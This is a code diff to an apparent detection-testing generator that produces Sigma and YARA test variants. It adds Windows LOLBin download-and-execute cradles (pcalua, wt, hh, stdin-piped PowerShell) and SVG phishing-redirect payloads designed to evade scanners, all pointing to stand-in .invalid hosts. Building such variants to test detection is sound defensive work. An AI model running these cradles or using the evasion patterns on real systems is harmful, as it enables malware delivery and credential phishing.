@@ -27,6 +27,10 @@ class PromptEngine:
         "bitsadmin": ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin.exe"),
         "regsvr32": ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe"),
         "msiexec": ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe"),
+        "pcalua": ("C:\\Windows\\System32\\pcalua.exe", "pcalua.exe"),
+        "hh": ("C:\\Windows\\System32\\hh.exe", "hh.exe"),
+        "conhost": ("C:\\Windows\\System32\\conhost.exe", "conhost.exe"),
+        "wt": ("C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19\\wt.exe", "wt.exe"),
     }
 
     def generate_from_prompt(self, prompt: str, target_type: str = "sigma") -> Variant:
@@ -39,12 +43,23 @@ class PromptEngine:
         return self._build_sigma_variant(var_id, prompt, prompt_lower)
 
     def _build_sigma_variant(self, var_id: str, raw_prompt: str, p: str) -> Variant:
-        # 1. Identify LOLBin
+        # 1. Identify LOLBin with priority for proxy/wrapper tools
         selected_bin = "powershell"
-        for bin_name in self.LOLBINS_MAP:
-            if bin_name in p:
-                selected_bin = bin_name
-                break
+        if "pcalua" in p:
+            selected_bin = "pcalua"
+        elif "wt" in p or "terminal" in p:
+            selected_bin = "wt"
+        elif "hh" in p:
+            selected_bin = "hh"
+        elif "conhost" in p:
+            selected_bin = "conhost"
+        elif "stdin" in p or "pipe" in p:
+            selected_bin = "powershell"
+        else:
+            for bin_name in self.LOLBINS_MAP:
+                if bin_name in p:
+                    selected_bin = bin_name
+                    break
 
         full_path, bin_exec = self.LOLBINS_MAP[selected_bin]
 
@@ -60,9 +75,21 @@ class PromptEngine:
         # 3. Destination URI (Strictly RFC 2606)
         dest_domain = "https://cdn.delivery.stage.invalid/update"
 
-        # 4. Construct Command Line based on LOLBin
+        # 4. Construct Command Line based on LOLBin & Evasion Style
         axis = "syntax"
-        if selected_bin in ("powershell", "pwsh"):
+        if "pcalua" in p:
+            cmd = f'pcalua.exe -a powershell.exe -c "irm {dest_domain}.ps1 | iex"'
+            axis = "lolbin_proxy"
+        elif "stdin" in p or "pipe" in p:
+            cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -"
+            axis = "argument_hiding"
+        elif "wt" in p or "terminal" in p:
+            cmd = f'wt.exe powershell.exe {window_flag} -c "irm {dest_domain}.ps1 | iex"'
+            axis = "lolbin_proxy"
+        elif "hh" in p:
+            cmd = f"hh.exe {dest_domain}.chm"
+            axis = "lolbin"
+        elif selected_bin in ("powershell", "pwsh"):
             if "split" in p or "concatenat" in p:
                 cmd = f'{bin_exec} {window_flag} -c "&(\'Inv\'+\'oke-RestMethod\') {dest_domain}.ps1 | iex"'
                 axis = "obfuscation"
@@ -145,11 +172,15 @@ class PromptEngine:
         if "namespace" in p or "prefix" in p or "svg:svg" in p:
             svg_tag = "<svg:svg"
 
-        close_tag = "</svg:svg>" if svg_tag == "<svg:svg" else "</svg>"
-
         # Check script style
         axis = "structural"
-        if "cdata" in p:
+        if "foreignobject" in p or "meta" in p or "refresh" in p:
+            body = '  <foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><meta http-equiv="refresh" content="0;url=https://auth.stage.invalid/login"/></body></foreignObject>'
+            axis = "parser_differential"
+        elif "animate" in p or "smil" in p:
+            body = '  <animate attributeName="href" values="https://auth.stage.invalid/login" begin="0s"/><a href="#"><text>Click</text></a>'
+            axis = "syntax"
+        elif "cdata" in p:
             body = '  <script><![CDATA[ window.location.href = "https://auth.stage.invalid/login"; ]]></script>'
         elif "bracket" in p or "concatenat" in p:
             body = '  <script>window["loc"+"ation"]["hr"+"ef"] = "https://auth.stage.invalid/login";</script>'
@@ -187,7 +218,9 @@ class PromptEngine:
             templates = [
                 ("SVG with 2KB comment header pushing root element", "Probe YARA scan window with 2048 bytes of comment padding"),
                 ("SVG using <svg:svg> XML namespace alias", "Test SVG parsing with namespace prefix <svg:svg> and location.replace"),
+                ("SVG foreignObject HTML meta-refresh redirect", "Test SVG foreignObject containing HTML meta-refresh redirect to external URL"),
                 ("SVG dynamic property concatenation", "Test JavaScript bracket access window['location']['href'] to evade literal strings"),
+                ("SVG SMIL animation href redirection", "Test SVG SMIL animate attributeName href redirecting without script tags"),
                 ("SVG CDATA enclosed script block", "Evaluate script execution wrapped in CDATA encapsulation with external https URI"),
                 ("SVG onerror image redirect handler", "Test image element triggering onerror event handler to redirect browser"),
                 ("SVG with 4.5KB comment padding (boundary push)", "Probe boundary beyond 4096 bytes using 4500 bytes of XML comment padding"),
@@ -197,10 +230,14 @@ class PromptEngine:
 
         templates = [
             ("PowerShell with integer -w 1 switch alias", "Test ClickFix PowerShell execution with integer window switch -w 1"),
+            ("Explorer launching pcalua.exe as LOLBin proxy", "Simulate Explorer launching pcalua.exe to proxy powershell download"),
             ("PowerShell with abbreviated -w h switch alias", "Simulate PowerShell execution with abbreviated -w h switch"),
+            ("CMD stdin pipe injection into powershell", "Simulate CMD streaming download payload via stdin pipe into powershell"),
             ("PowerShell with split Invoke-RestMethod cmdlet", "Probe cmdlet splitting &('Inv'+'oke-RestMethod') with download"),
             ("Rundll32 URL Protocol Handler invocation", "Simulate Explorer spawning rundll32 url.dll,FileProtocolHandler to remote HTA"),
+            ("Explorer launching Windows Terminal wrapper wt.exe", "Simulate Explorer spawning wt.exe to wrap powershell execution"),
             ("Windows Script Host remote script execution", "Test Explorer spawning wscript.exe with remote https VBScript destination"),
+            ("Explorer launching HTML Help hh.exe", "Test Explorer spawning hh.exe targeting remote CHM payload"),
             ("Curl silent background download cradle", "Test Explorer spawning curl.exe downloading binary payload to temp directory"),
             ("CMD start /b background PowerShell staging", "Simulate CMD launching background PowerShell cradle using start /b"),
             ("Certutil living-off-the-land remote download", "Test Explorer spawning certutil.exe -urlcache -split to fetch remote payload"),
